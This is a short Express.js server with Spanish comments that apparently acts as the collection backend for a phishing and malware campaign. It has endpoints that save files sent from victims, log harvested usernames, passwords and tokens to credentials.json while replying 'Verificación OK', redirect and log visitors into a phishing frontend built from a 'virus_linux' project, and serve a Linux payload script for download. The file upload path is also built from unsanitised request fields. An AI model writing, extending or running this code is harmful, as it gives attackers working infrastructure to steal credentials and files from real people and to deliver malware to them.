import express from "express";
import fs from "fs";

const PORT = 3000;
const app = express();
app.use(express.json());

app.post("/attach", (req, res) => {
  const { data } = req.body;
  console.log(`Data capturada ${data.nombreCarpeta}: ${data.nombreArchivo}`);
  const folderPath = `./watchdog/${data.nombreCarpeta}`;
  try {
    if (!fs.existsSync("./watchdog")) {
      fs.mkdirSync("./watchdog");
    }
    if (!fs.existsSync(folderPath)) {
      fs.mkdirSync(folderPath);
    }
    const filePath = `${folderPath}/${data.nombreArchivo}`;

    fs.writeFileSync(filePath, data.contenido);
    console.log(`[ARCHIVO] Archivo ${filePath} creado/actualizado con éxito.`);
    res.status(200).send("Archivo recibido y guardado.");
  } catch (e) {
    console.error(`[ERROR] No se pudo crear la carpeta ${folderPath}: ${e}`);
  }
});

// ENDPOINT para RECIBIR CREDENCIALES
app.post("/steal", express.json(), (req, res) => {
  console.log("CREDENCIALES RECIBIDAS:", req.body);

  const credencial = {
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get("User-Agent"),
    ...req.body, // username, password, token, etc.
  };

  // GUARDAR EN JSON (tus datos actuales)
  const dataFile = "./credentials.json";
  let allData = [];

  if (fs.existsSync(dataFile)) {
    allData = JSON.parse(fs.readFileSync(dataFile, "utf8"));
  }

  allData.push(credencial);
  fs.writeFileSync(dataFile, JSON.stringify(allData, null, 2));

  console.log(`Guardado ${allData.length} registros en credentials.json`);

  // RESPONDER al frontend (exito)
  res.json({ success: true, message: "Verificación OK" });
});

//  REDIRECTOR (entrada del chain de ataque)
app.get("/redirect", (req, res) => {
  const { url, next } = req.query;
  console.log(`REDIRECT desde: ${req.ip} → ${next || url}`);

  // LOG del redirect
  const log = {
    timestamp: new Date().toISOString(),
    ip: req.ip,
    target: next || url,
    userAgent: req.get("User-Agent"),
  };

  fs.appendFileSync("./redirects.log", JSON.stringify(log) + "\n");

  // REDIRIGIR al TU Vue Frontend
  res.redirect(
    `http://localhost:5173/?from=${encodeURIComponent(next || url)}`,
  );
});

// 3. SERVIR TU Vue Frontend estático (opcional)
app.use("/phish", express.static("../virus_linux/dist")); // Después de build

// 4. PAYLOAD ENDPOINT (descarga Linux)
app.get("/payload", (req, res) => {
  res.download("./linux-payload.sh"); // Crea este archivo después
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
